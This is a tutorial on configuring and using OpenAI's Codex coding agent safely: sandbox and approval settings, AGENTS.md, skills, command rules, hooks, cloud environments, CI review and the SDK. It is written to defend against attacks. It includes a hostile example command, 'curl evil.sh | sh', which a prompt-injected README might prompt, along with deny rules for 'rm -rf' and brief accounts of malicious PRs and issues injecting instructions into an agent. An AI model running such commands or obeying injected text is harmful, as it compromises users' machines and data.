How to use this guide — you do NOT have to start at Module 1.1
This guide is built to be non-linear. Each module is self-contained with its own prerequisites, skip-check, and outcomes. Use the Placement Quiz below to find your entry point, or jump straight to any module using the Module Index. Every exercise and capstone uses the same realistic DevToolkit project — a TypeScript + Express + Prisma REST API that you build and extend with Codex. Spec in datasets/devtoolkit/.

Disambiguation: "Codex" today means OpenAI's coding agent (CLI, IDE extension, desktop/web app, cloud tasks). It is not the 2021 Codex language model that powered early GitHub Copilot — that model was retired in 2023. Anything you read about code-davinci-002 or "Codex API completions" is about the old model and does not apply here.

Quick Start: Three Ways to Use This Guide

  1. Complete beginner → Start at Module 1.1 and go sequentially.
  2. Some experience → Take the Placement Quiz (next section) to find your entry point.
  3. Targeting a specific skill → Jump via the Module Index or Learning Tracks — Track 4 is built for people who already use Claude Code.

Phase 1: Foundations

Weeks 1–2 | Goal: run Codex confidently on a real repo and get useful, reviewable changes

Module 1.1 — What Codex Is

Level: Beginner · Prereqs: None · Time: ~2h
Skip-check (test-out): Explain, without notes, when you would use the CLI versus a cloud task, and which plan tier lacks cloud features.
Skip if: You already use Codex across at least two surfaces.
Unlocks: 1.2, 1.4

One agent, several surfaces

Codex is a single coding agent you reach through several front ends. They share the same agent and, locally, the same configuration in ~/.codex/ — so what you learn in the CLI transfers to the IDE extension. Knowing which surface runs where matters because it decides which files and secrets the agent can touch.

SurfaceRuns onBest for
Codex CLI (codex)Your machine, in a terminalInteractive work in a local repo; scripting with codex exec
IDE extensionYour machine, inside VS Code (and forks such as Cursor and Windsurf) or JetBrains IDEsEditing with open-file context; handing work off to the cloud
ChatGPT desktop / web / mobile appDesktop: your machine; web and mobile: OpenAI's cloudManaging many parallel chats, reviewing cloud results
Codex cloudIsolated OpenAI-managed containersLong or parallel tasks against a GitHub repo while you do something else
GitHub @codexCodex cloudPR review and fix requests from pull-request comments
codex exec, GitHub Action, SDKWherever you run them (CI, servers)Automation with no human at the keyboard

The agent loop

Every Codex turn is the same loop: read context (your prompt, AGENTS.md, files) → plan → run tools (shell commands, file edits, MCP tools) inside a sandbox → observe results → repeat until done or blocked → report. The sandbox and approval policy (Module 2.1) sit between "run tools" and your machine. If you remember one thing: Codex acts, it does not just suggest — so its permissions matter more than its prose.

Plans and access

Codex is included with ChatGPT plans (Free, Go, Plus, Pro, Business, Enterprise & Edu, with limits that grow by tier) and can also run on an OpenAI API key. API-key use covers the CLI, IDE, codex exec and SDK, but not Codex cloud features — cloud tasks need a ChatGPT sign-in. Check the current plan page before budgeting; limits change often.

Mapping from Claude Code

If you already use Claude Code, most concepts have a direct counterpart. Learning the mapping first prevents the most common switching error: putting instructions in the wrong file and wondering why the agent ignores them.

Claude Code                          OpenAI Codex
-----------------------------------  -----------------------------------------------
CLAUDE.md                            AGENTS.md (global ~/.codex/AGENTS.md + repo files)
~/.claude/settings.json              ~/.codex/config.toml (TOML, not JSON)
.claude/settings.json (project)      .codex/config.toml (loaded only for trusted projects)
Permission modes                     sandbox_mode + approval_policy (two separate axes)
.mcp.json / claude mcp add           [mcp_servers.<id>] tables in config.toml
Skills (.claude/skills/*/SKILL.md)   Skills (.agents/skills/*/SKILL.md)
Hooks (settings.json "hooks")        hooks.json or [hooks] in config.toml, features.hooks
claude -p "..."                      codex exec "..."
claude --resume / --continue         codex resume / codex exec resume --last
Claude Agent SDK                     Codex SDK (@openai/codex-sdk)
anthropics/claude-code-action        openai/codex-action@v1

Common mistake: treating "sandbox" and "approvals" as one setting. In Codex they are independent: the sandbox says what a command is technically able to touch; the approval policy says when Codex must stop and ask you. A permissive sandbox with never approvals is the risky combination — not either setting alone.

Module 1.2 — Install, Sign In, First Session

Level: Beginner · Prereqs: 1.1 · Time: ~2h
Skip-check (test-out): codex --version prints 0.171.0 or later, and you have completed a session that edited a file.
Skip if: Codex is installed, current, and signed in.
Unlocks: 1.3, 1.4, 2.1

Install

Pick one installer and stick with it; mixing npm and Homebrew installs leaves two codex binaries on your PATH, and you end up updating the one you aren't running.

# npm (Node 18+)
npm install -g @openai/codex

# or Homebrew (macOS)
brew install --cask codex

# or the standalone installer
curl -fsSL https://chatgpt.com/codex/install.sh | sh

# confirm which binary runs and its version
which codex && codex --version

# update later with the same tool you installed with
npm install -g @openai/codex        # npm
brew upgrade --cask codex           # Homebrew

Sign in

Run codex and choose Sign in with ChatGPT, or set an API key for headless use. Credentials land in ~/.codex/auth.json; treat that file like a password — anyone who copies it can spend your plan's usage.

# interactive: opens a browser sign-in on first run
codex

# headless / CI: API key via environment variable (supported by codex exec and the SDK)
export CODEX_API_KEY="sk-..."   # set in your shell profile or a secret manager, never in the repo

# keep the credentials file private
chmod 600 ~/.codex/auth.json

First session on DevToolkit

Start Codex from the repo root. Codex treats the directory you launch from as the workspace, so launching from ~ gives it your whole home directory as context and as a write target.

mkdir devtoolkit && cd devtoolkit && git init
codex "Scaffold a Node 20 + TypeScript (strict) Express app. Add GET /health returning {\"status\":\"ok\"}, a Vitest + Supertest test for it, and npm scripts dev, build, test. Run the tests before you finish."

Watch the transcript: each shell command Codex proposes, each file it edits, and the final summary. Commit before every new task — git is your undo button, independent of Codex's own /undo.

Module 1.3 — Prompting and Plan Mode

Level: Beginner · Prereqs: 1.2 · Time: ~3h
Skip-check (test-out): Get Codex to add a validated POST endpoint in one prompt, with tests passing and no follow-up corrections.
Skip if: Your prompts routinely include scope, constraints, and a verification step.
Unlocks: 2.3, 2.4

The four-part task prompt

Codex fills gaps with guesses. Every unspecified decision (library, file location, error shape) is a coin flip you'll pay for in review. A good task prompt removes the coin flips.

GOAL     Add POST /users to DevToolkit that creates a user.
CONTEXT  Routes live in src/routes/. Prisma client is in src/lib/db.ts.
         Follow the pattern in src/routes/health.ts.
RULES    Validate the body with Zod (email, password min 12 chars).
         Hash with bcryptjs, 12 rounds. Never return the password hash.
         Errors use the shape { error: string, code?: string }.
DONE     npm test passes, including new tests for: valid create (201),
         invalid email (400), duplicate email (409).
         Show me the diff summary when finished.

Plan mode for multi-step work

For anything touching more than two or three files, ask for a plan first. Use /plan (or Shift+Tab in the CLI) so Codex proposes steps without editing. Reviewing a ten-line plan costs a minute; reviewing a wrong 400-line diff costs an hour.

/plan Add JWT auth to DevToolkit: POST /auth/login issues a 24h token,
a requireAuth middleware protects GET /users. List files you will create
or change, new dependencies, and the tests you will add. Do not edit yet.

(review the plan, then:)
Go ahead with steps 1-3 only. Stop after the middleware tests pass.

Steering mid-task

You can type while Codex works to redirect it; press Esc to interrupt a run that's heading the wrong way. Interrupt early — every extra step it takes on a wrong path is a step you must review and revert.

Module 1.4 — Models and Reasoning Effort

Level: Beginner–Intermediate · Prereqs: 1.2 · Time: ~2h
Skip-check (test-out): Set a default model and effort in config.toml, override it for one session with /model, and explain the trade-off.
Skip if: You already choose model and effort per task.
Unlocks: 2.2

Current models (as of 2026-11-22)

Codex CLI 0.171.0 added the GPT-6.2 Sol and GPT-6.2 Astra models to its catalog, with Sol as the default. Use Sol for everyday coding, and switch to Astra for the hardest multi-file reasoning. Older entries (GPT-6.1 Sol and Terra, the GPT-6 family) stay available for a while after a new release. Model lineups change every few months, so always check /model for what your install offers; don't copy model names from blog posts.

Reasoning effort

model_reasoning_effort trades speed and usage for depth. Higher effort helps on ambiguous debugging and design. On mechanical edits it mostly burns usage and time. The available levels depend on the model and client, ranging from low upward through higher tiers. /model shows the levels your current model supports.

# ~/.codex/config.toml
model = "gpt-6.2-sol"              # pick the exact slug shown by /model
model_reasoning_effort = "medium"  # everyday default
model_reasoning_summary = "concise"
model_verbosity = "low"            # shorter final messages
review_model = "gpt-6.2-astra"     # model used by /review
plan_mode_reasoning_effort = "high"

In a session, /model switches model and effort for that session without editing the file.

Task type                         Model        Effort   Why
--------------------------------  -----------  -------  --------------------------------
Rename / format / add a test      Sol          low      Mechanical; speed matters
New endpoint with known pattern   Sol          medium   Default
Flaky test, unclear root cause    Astra        high     Needs hypothesis testing
Cross-cutting auth refactor plan  Astra        high     Plan once, execute at medium
Code review (/review)             Astra        high     Misses are costly

Module 2.1 — Sandbox and Approvals

Level: Beginner–Intermediate · Prereqs: 1.2 · Time: ~3h
Skip-check (test-out): Configure Codex so it can edit DevToolkit and run tests without prompts, but cannot reach the network or write outside the repo — then prove both limits.
Skip if: You can state the three sandbox modes and the supported approval policies from memory.
Unlocks: 2.2, 3.3, 4.1

Sandbox modes — what a command can do

sandbox_modeFile writesNetworkUse when
read-onlyNoneOffExploring, reviewing, answering questions. Default for codex exec.
workspace-writeWorkspace (+ writable_roots, temp dirs)Off unless network_access = trueNormal coding
danger-full-accessAnywhere your user can writeOnOnly inside a disposable container or VM

The sandbox is enforced by the OS (Seatbelt on macOS, Linux sandboxing, a native sandbox on Windows), not by the model's good intentions. That's the point: a prompt-injected README can talk the model into trying curl evil.sh | sh, but the sandbox still blocks the network call.

Approval policies — when Codex must ask

  • on-request — Codex runs inside the sandbox freely and asks you when it needs to step outside it (e.g. network, writing outside the workspace). The everyday default.
  • never — never asks; anything the sandbox blocks simply fails. Right for CI, where nobody is there to answer.
  • { granular = { ... } } — per-category control over sandbox approvals, rules prompts, MCP elicitations, permission requests and skill approvals.

Version note: untrusted is no longer supported and on-failure is deprecated; codex exec --full-auto was removed — use --sandbox workspace-write instead. Older tutorials still show these; they will error or warn on current releases.

# ~/.codex/config.toml — sensible everyday baseline
sandbox_mode = "workspace-write"
approval_policy = "on-request"

[sandbox_workspace_write]
network_access = false
writable_roots = []

Inside a session, /permissions changes the boundaries for the current run without editing config.

Proving the limits

Don't assume a setting works — test it. A one-minute test now beats discovering in an incident that a typo made your config.toml silently fall back to defaults.

cd devtoolkit
# should fail: network is off in workspace-write
codex exec --sandbox workspace-write "Run: curl -sS https://example.com and report the exit code"

# should fail: outside the workspace
codex exec --sandbox workspace-write "Create the file ../outside.txt containing hi, then report whether it worked"

# should succeed: inside the workspace
codex exec --sandbox workspace-write "Run npm test and report the summary line"

Module 2.2 — config.toml and Profiles

Level: Intermediate · Prereqs: 2.1 · Time: ~3h
Skip-check (test-out): Run the same prompt under a safe and a ci profile and show the different sandbox in each transcript.
Skip if: You already maintain multiple profiles and project-scoped config.
Unlocks: 3.1, 3.3

Where config comes from

  • ~/.codex/config.toml — your user settings ($CODEX_HOME overrides the ~/.codex location).
  • .codex/config.toml in a repo — project settings, loaded only if you trust the project. Trust is recorded in your user config.
  • Profiles — separate files at $CODEX_HOME/<name>.config.toml, selected with --profile <name>.

Why the trust gate: a cloned repo could otherwise ship a .codex/config.toml that grants itself full access. For the same reason, project config cannot set high-risk keys such as model_provider, notify, profile or base URLs.

# ~/.codex/config.toml
model = "gpt-6.2-sol"
model_reasoning_effort = "medium"
sandbox_mode = "workspace-write"
approval_policy = "on-request"

[projects."/Users/you/code/devtoolkit"]
trust_level = "trusted"
# ~/.codex/ci.config.toml   (use with: codex exec --profile ci "...")
approval_policy = "never"
sandbox_mode = "workspace-write"
model_reasoning_effort = "low"

[sandbox_workspace_write]
network_access = false
# devtoolkit/.codex/config.toml   (checked in; applies once trusted)
model_reasoning_effort = "high"
review_model = "gpt-6.2-astra"

Precedence

From weakest to strongest: built-in defaults → user config → trusted project config → selected profile → command-line flags and in-session commands such as /model. When behavior surprises you, run /status to see the effective model, sandbox and approval policy instead of guessing which file won.

Module 2.3 — AGENTS.md Project Instructions

Level: Beginner–Intermediate · Prereqs: 1.3 · Time: ~3h
Skip-check (test-out): A fresh session, given only "add a DELETE /users/:id endpoint", follows your soft-delete, validation and error-shape conventions without being told.
Skip if: Your repo already has an AGENTS.md that Codex follows consistently.
Unlocks: 3.2, 3.4

Discovery

Codex reads ~/.codex/AGENTS.md (your personal defaults), then AGENTS.md files from the project root down to the current directory; the file closest to the work wins on conflicts. AGENTS.md is an open format shared by several coding agents, so one file can serve Codex and other agents that support it. Content is capped by project_doc_max_bytes, and anything past the cap is silently dropped. Keep the file short and front-load the rules that matter most.

/init drafts an AGENTS.md from your repo. Treat the draft as a starting point: it describes what is, while you need to add what must be.

# AGENTS.md — DevToolkit

## Commands
- Install: `npm ci`
- Test: `npm test` (Vitest + Supertest). Run before every finish.
- Type check: `npx tsc --noEmit`
- DB: `npx prisma migrate dev` (never `migrate reset` without asking)

## Conventions
- TypeScript strict. No `any`; use `unknown` and narrow.
- Validate every request body, query and param with Zod in the route file.
- Errors: respond `{ error: string, code?: string }` with the correct HTTP status.
- Users are soft-deleted: set `deletedAt`; all reads filter `deletedAt: null`.
- Passwords: bcryptjs, 12 rounds. Never log or return `passwordHash`.

## Layout
- Routes: `src/routes/*.ts`, one router per resource
- Middleware: `src/middleware/`
- DB client: `src/lib/db.ts` (import, never instantiate PrismaClient elsewhere)

## Do not
- Edit `prisma/migrations/` by hand.
- Add dependencies without saying why in the final message.
- Commit or push. The human commits.

Nested files for local rules

Put rules that apply to one area next to that area. A src/routes/AGENTS.md about route conventions is read only when Codex works there, which keeps the root file small and under the byte cap.

# src/routes/AGENTS.md
- Every new route gets a test file in `tests/routes/` with the same name.
- Mount new routers in `src/app.ts` in alphabetical order.
- Protected routes use `requireAuth` from `src/middleware/auth.ts`.

What MCP adds

The Model Context Protocol lets Codex call tools that live outside the shell, such as current library docs, GitHub issues, or your database. Each server you add is code that runs with your credentials. Add only servers you would also trust as an npm dependency, and expose only the tools the task needs.

Configuring servers in config.toml

# ~/.codex/config.toml

# stdio server: up-to-date library docs
[mcp_servers.context7]
command = "npx"
args = ["-y", "@upstash/context7-mcp"]
startup_timeout_sec = 20
tool_timeout_sec = 60

# streamable HTTP server: GitHub, token read from an env var (never inline)
[mcp_servers.github]
url = "https://api.githubcopilot.com/mcp/"
bearer_token_env_var = "GITHUB_PAT"
enabled_tools = ["get_issue", "list_issues", "get_pull_request"]

# keep a server defined but switched off
[mcp_servers.experimental]
command = "node"
args = ["./tools/experimental-mcp.js"]
enabled = false

Key options: command/args/env/cwd for stdio servers; url, bearer_token_env_var, http_headers or auth = "oauth" for HTTP servers; enabled_tools/disabled_tools to scope; required = true to fail fast if a server you depend on doesn't start. The codex mcp command manages the same entries from the shell (run codex mcp --help for your version's subcommands). In a session, /mcp lists what is connected.

Why bearer_token_env_var: a token pasted into config.toml ends up in dotfile backups and screenshots. If you reference an env var instead, the file is safe to share.

Skills versus AGENTS.md

AGENTS.md is always loaded. A skill is loaded only when relevant. Codex sees each skill's name and description up front and reads the full SKILL.md only when a task matches. Put always-true rules in AGENTS.md and multi-step procedures in skills. If you push procedures into AGENTS.md instead, they eat the byte cap and dilute the rules that matter on every task.

Repo skills live in .agents/skills/<name>/SKILL.md; personal skills live in ~/.agents/skills/. Invoke one explicitly by mentioning it with $ (for example $api-endpoint), or let Codex choose it from the description. A bundled $skill-creator skill can draft new skills for you.

---
name: api-endpoint
description: Create a new DevToolkit REST resource (Express router, Zod schemas, Prisma access, Vitest + Supertest tests). Use when asked to add an endpoint or resource.
---

# Add a DevToolkit resource

1. Read `AGENTS.md` and `src/routes/users.ts` as the reference pattern.
2. Create `src/schemas/<resource>.ts` with Zod schemas for create, update, params and list query (limit 1-100, default 20; cursor optional).
3. Create `src/routes/<resource>.ts`:
   - parse every input with the schemas; on failure respond 400 `{ error, code: "VALIDATION" }`
   - reads filter `deletedAt: null`; DELETE sets `deletedAt`
   - protected by `requireAuth`
4. Mount the router in `src/app.ts` in alphabetical order.
5. Add the Prisma model if missing, then run `npx prisma migrate dev --name add_<resource>`.
6. Create `tests/routes/<resource>.test.ts` covering 201, 400, 401, 404 and soft-delete.
7. Run `npx tsc --noEmit` and `npm test`. Fix failures before reporting.
8. Final message: files changed, migration name, test count.

Module 3.3 — Hooks and Rules

Rules: command policy

Rules (.rules files, the "execpolicy") decide, by command prefix, whether a shell command runs freely, needs your approval, or is forbidden. The sandbox limits where a command can act. Rules limit which commands run at all. You need both, because git push --force is fully inside the workspace and still destructive.

# ~/.codex/rules/default.rules  (Starlark syntax; see the Rules docs page for file locations in your version)
prefix_rule(pattern = ["git", "push"], decision = "prompt")
prefix_rule(pattern = ["git", "reset", "--hard"], decision = "prompt")
prefix_rule(pattern = ["npx", "prisma", "migrate", "reset"], decision = "forbidden")
prefix_rule(pattern = ["rm", "-rf"], decision = "forbidden")
prefix_rule(pattern = ["npm", "test"], decision = "allow")

codex exec --ignore-rules skips rules for one run. Never put that flag in CI, because it turns your policy off exactly where nobody is watching.

Hooks: run your code at lifecycle events

Hooks run a command (or MCP tool) when an event fires: SessionStart, UserPromptSubmit, PreToolUse, PermissionRequest, PostToolUse, PreCompact, Stop, SessionEnd, subagent start/stop and more. Enable them with features.hooks, then define them in hooks.json or a [hooks] table in config.toml. The hooks reference documents the registration schema and what each event receives on stdin.

A good first hook is an audit log. It only observes and never blocks, so a bug in it can't stall your session:

#!/usr/bin/env bash
# ~/.codex/hooks/audit-log.sh — register for PostToolUse
set -euo pipefail
log_dir="${HOME}/.codex/audit"
mkdir -p "$log_dir"
payload="$(cat)"
ts="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
repo="$(basename "$(git rev-parse --show-toplevel 2>/dev/null || pwd)")"
printf '%s\t%s\t%s\n' "$ts" "$repo" "$(printf '%s' "$payload" | tr '\n' ' ' | cut -c1-2000)" \
  >> "${log_dir}/$(date -u +%Y-%m-%d).tsv"
exit 0
# ~/.codex/config.toml
[features]
hooks = true

Hooks vs. rules: if what you want is "never run X", write a rule. It is declarative and enforced before execution. Use a hook when you need logic: formatting after edits, posting a notification at Stop, or loading context at SessionStart.

IDE extension

The Codex extension runs in VS Code and its forks (Cursor, Windsurf) and in JetBrains IDEs (IntelliJ, PyCharm, WebStorm, Rider). Use the CLI when it's anchored to a command or a script.

Cloud environments

A cloud task runs in an isolated container with a copy of your GitHub repo. You create the environment once in the ChatGPT app (Work in › Cloud › Select environment › Create environment) and publish it. Its main settings:

  • Install script — runs on setup (dependencies, codegen).
  • Environment variables vs. secrets — secrets are scoped to allowed domains so they can't be exfiltrated to arbitrary hosts.
  • Internet access — off, an allow-list ("Additional allowed domains", "Package managers" preset), or all public internet. Prefer the allow-list. A task that reads an untrusted issue with full internet access is a prompt-injection exfiltration path.
#!/usr/bin/env bash
# DevToolkit cloud environment — install script
set -euo pipefail
npm ci
npx prisma generate
npx tsc --noEmit

Integration tests that need PostgreSQL must reach a database. Point DATABASE_URL at a disposable hosted test database: store it as a secret and allow-list only that host. Never point it at production. A cloud task does whatever its prompt and any text it reads tell it to, inside whatever the environment can reach.

From the terminal, codex cloud lets you browse active and finished cloud chats, submit work to an environment, and apply the result to your local checkout.

Plan note: cloud tasks need a ChatGPT sign-in; API-key-only setups don't get them. Machine size also depends on the plan (smaller on Plus, larger on Pro/Business/Enterprise).

Module 4.1 — codex exec and Structured Output

Level: Intermediate · Prereqs: 2.1 · Time: ~3h

The non-interactive mode

codex exec "<prompt>" runs one task to completion and exits. It defaults to a read-only sandbox, so a script can't modify your repo unless you say so. That's the right default for automation, where nobody reviews intermediate steps.

FlagEffect
--sandbox workspace-writeAllow edits in the workspace (replaces the removed --full-auto)
--jsonStream events to stdout as JSON Lines instead of human text
--output-schema ./schema.jsonFinal message must be JSON matching this schema
-o, --output-last-message <path>Write the final message to a file
--profile <name>Use a profile (e.g. ci from Module 2.2)
--ephemeralDon't persist the session
--skip-git-repo-checkAllow running outside a git repo
--ignore-user-configIgnore ~/.codex/config.toml for reproducible runs
codex exec resume --last "<prompt>"Continue the most recent exec session

A health-report schema

{
  "type": "object",
  "additionalProperties": false,
  "required": ["tests_passed", "failing_tests", "typecheck_ok", "risks"],
  "properties": {
    "tests_passed": { "type": "boolean" },
    "failing_tests": { "type": "array", "items": { "type": "string" } },
    "typecheck_ok": { "type": "boolean" },
    "risks": {
      "type": "array",
      "items": {
        "type": "object",
        "additionalProperties": false,
        "required": ["file", "issue", "severity"],
        "properties": {
          "file": { "type": "string" },
          "issue": { "type": "string" },
          "severity": { "type": "string", "enum": ["low", "medium", "high"] }
        }
      }
    }
  }
}
#!/usr/bin/env bash
# scripts/codex-health.sh — DevToolkit nightly health check
set -euo pipefail
cd "$(git rev-parse --show-toplevel)"
out="$(mktemp)"
codex exec \
  --profile ci \
  --sandbox workspace-write \
  --ephemeral \
  --output-schema scripts/health.schema.json \
  -o "$out" \
  "Run npm test and npx tsc --noEmit. Then scan src/routes for missing Zod validation or missing deletedAt filters. Report using the schema. Do not modify files."

cat "$out"
if [ "$(jq -r '.tests_passed and .typecheck_ok' "$out")" != "true" ]; then
  echo "DevToolkit health check failed" >&2
  exit 1
fi
high="$(jq '[.risks[] | select(.severity == "high")] | length' "$out")"
if [ "$high" -gt 0 ]; then
  echo "$high high-severity risk(s) found" >&2
  exit 2
fi

Common mistake: parsing Codex's prose with grep. Its wording changes between runs and models, so the script breaks silently. Use a schema, and your script reads a contract instead of a paragraph.

Module 4.2 — GitHub Review and CI

Level: Intermediate · Prereqs: 4.1 · Time: ~4h

Two ways Codex reviews PRs

  • Codex GitHub integration — connect the repo in Codex settings, enable code review, then comment @codex review on a PR (or turn on automatic reviews). It runs in Codex cloud under your ChatGPT plan. Add a ## Review guidelines section to AGENTS.md to steer what it flags.
  • openai/codex-action@v1 — runs Codex inside your own GitHub Actions job with an API key. You control the prompt, the sandbox, the output, and when it runs.
## Review guidelines
- Flag any route that reads users without `deletedAt: null`.
- Flag request input used before Zod parsing.
- Flag logging of `passwordHash`, tokens, or `req.body` on auth routes.
- Ignore formatting; Prettier handles it.

A workflow with least privilege

# .github/workflows/codex-review.yml
name: Codex PR review
on:
  pull_request:
    types: [opened, synchronize]

permissions:
  contents: read

jobs:
  review:
    runs-on: ubuntu-latest
    outputs:
      review: ${{ steps.codex.outputs.final-message }}
    steps:
      - uses: actions/checkout@v5
        with:
          fetch-depth: 0
      - name: Run Codex review
        id: codex
        uses: openai/codex-action@v1
        with:
          openai-api-key: ${{ secrets.OPENAI_API_KEY }}
          prompt-file: .github/codex/review.md
          sandbox: read-only
          safety-strategy: drop-sudo
          effort: high

  comment:
    needs: review
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/github-script@v7
        env:
          REVIEW: ${{ needs.review.outputs.review }}
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              body: process.env.REVIEW || "Codex returned no review.",
            });
<!-- .github/codex/review.md -->
You are reviewing a pull request to DevToolkit.
Get the change set with: git diff origin/main...HEAD

Apply the "Review guidelines" section of AGENTS.md.
Report at most 8 findings, most severe first, each as:
- **file:line** — problem — concrete fix
If there are no real problems, say "No blocking issues." Do not modify files.

Why it is split into two jobs

The PR's code and text are untrusted input; a malicious PR can contain instructions aimed at the agent. Here the job that runs Codex can only read (contents: read, sandbox: read-only, drop-sudo). The job that can write to the PR never runs Codex. An injected instruction therefore has nothing dangerous to reach. Pass the API key only on the step that needs it, never as a job-wide env. GitHub also withholds secrets from fork PRs, so plan how forks are handled.

When to use the SDK

codex exec is enough for scripts. Use the SDK (@openai/codex-sdk, Node 18+, server-side only) when Codex is one step in a larger program. Typical cases are a bot that triages issues, an internal tool, or a pipeline that needs to stream progress and keep threads alive across requests. It drives the same agent and honors the same config, AGENTS.md and sandbox.

npm install @openai/codex-sdk zod
npm install -D tsx
// scripts/triage.ts — run with: npx tsx scripts/triage.ts "GET /users returns deleted users"
import { Codex } from "@openai/codex-sdk";
import { z } from "zod";

const Triage = z.object({
  area: z.enum(["routes", "middleware", "db", "tests", "config"]),
  files: z.array(z.string()),
  root_cause: z.string(),
  fix_plan: z.array(z.string()),
});
type Triage = z.infer<typeof Triage>;

const triageSchema = {
  type: "object",
  additionalProperties: false,
  required: ["area", "files", "root_cause", "fix_plan"],
  properties: {
    area: { type: "string", enum: ["routes", "middleware", "db", "tests", "config"] },
    files: { type: "array", items: { type: "string" } },
    root_cause: { type: "string" },
    fix_plan: { type: "array", items: { type: "string" } },
  },
} as const;

async function main(): Promise<void> {
  const report = process.argv[2];
  if (!report) {
    console.error("usage: triage.ts \"<bug report>\"");
    process.exit(1);
  }

  const codex = new Codex();
  const thread = codex.startThread({ workingDirectory: process.cwd() });

  const turn = await thread.run(
    `Triage this DevToolkit bug report without editing files: ${report}`,
    { outputSchema: triageSchema },
  );
  const triage: Triage = Triage.parse(JSON.parse(turn.finalResponse));
  console.log(JSON.stringify(triage, null, 2));
  console.log(`thread: ${thread.id}`);

  const { events } = await thread.runStreamed(
    "Now write a failing Vitest test that reproduces it. Do not fix the bug yet.",
  );
  for await (const event of events) {
    if (event.type === "item.completed") {
      console.log(`[${event.item.type}] done`);
    } else if (event.type === "turn.completed") {
      console.log("turn usage:", event.usage);
    }
  }
}

main().catch((err: unknown) => {
  console.error(err instanceof Error ? err.message : err);
  process.exit(1);
});

Key points: run() on the same thread continues the conversation; thread.id lets you codex.resumeThread(id) later, even from another process; runStreamed() yields structured events so you can report progress; and validating with Zod after the schema catches drift instead of trusting it. The SDK authenticates via your Codex sign-in or CODEX_API_KEY.

Glossary

Canonical terms for this guide. Definitions state what a term is, not how to use it. Each Avoid line lists synonyms that cause confusion.

Core Concepts

Codex
OpenAI's coding agent, reachable through the CLI, IDE extension, ChatGPT apps, cloud tasks, GitHub, the GitHub Action and the SDK.
Avoid: "Codex model", "Codex API" — those refer to the retired 2021 language model.
Surface
A front end through which you drive the same Codex agent (CLI, IDE, app, cloud, GitHub).
Avoid: "product", "version" — they imply different agents with different behavior.
Session
One persisted conversation with Codex, resumable with codex resume.
Avoid: "chat" when you mean a resumable unit; "thread" outside the SDK.
Thread
The SDK's handle on a session; it has an id and accepts repeated run() calls.
Avoid: "conversation object", "context".
Turn
One prompt plus all the tool calls and output Codex produces until it hands control back.
Avoid: "step" — a turn contains many steps.
Workspace
The directory Codex was launched in, and the default writable root under workspace-write.
Avoid: "project" when you mean the writable boundary.
Cloud task
Work Codex performs in an isolated OpenAI-managed container against a GitHub repo.
Avoid: "remote session" — that is a separate CLI feature for attaching to a running server.
Environment
The saved cloud configuration (repo, install script, variables, secrets, internet policy) a cloud task runs in.
Avoid: "container", "env vars" — the environment includes both and more.

Control & Configuration

Sandbox mode
The OS-enforced limit on what Codex's commands can touch: read-only, workspace-write or danger-full-access.
Avoid: "permission mode", "auto mode" — those blur sandbox and approvals together.
Approval policy
The setting that decides when Codex must pause for your consent: on-request, never or granular.
Avoid: "full-auto", "untrusted" — removed or unsupported in current releases.
Profile
A named config file at $CODEX_HOME/<name>.config.toml selected with --profile.
Avoid: "preset", "mode".
Trusted project
A repo marked trust_level = "trusted" in user config, which allows its .codex/config.toml to load.
Avoid: "allowed directory" — trust governs config loading, not write access.
AGENTS.md
A Markdown file of always-loaded instructions, discovered globally and from the repo root down to the working directory.
Avoid: "system prompt", "CLAUDE.md" — different mechanisms in different tools.
Reasoning effort
The per-request setting that trades latency and usage for deeper model reasoning.
Avoid: "temperature", "thinking budget".

Extension & Automation

MCP server
An external process or HTTP endpoint that exposes tools to Codex over the Model Context Protocol.
Avoid: "plugin", "integration" — too vague to say what runs where.
Skill
A folder with a SKILL.md procedure that Codex loads on demand when a task matches its description.
Avoid: "custom command", "macro".
Rule
A declarative command-prefix policy in a .rules file that allows, prompts for, or forbids shell commands.
Avoid: "hook" — rules decide; hooks run code.
Hook
A command or MCP tool that Codex runs when a lifecycle event such as PostToolUse or Stop fires.
Avoid: "callback", "trigger".
codex exec
Codex's non-interactive mode: run one task to completion and exit, read-only by default.
Avoid: "headless mode", "batch mode".
Output schema
A JSON Schema that constrains Codex's final message to machine-readable JSON.
Avoid: "JSON mode" — --json streams events, which is a different feature.
Safety strategy
The codex-action input that sets how Codex is isolated on the runner (default drop-sudo).
Avoid: "sandbox" — the action has its own sandbox input as well.
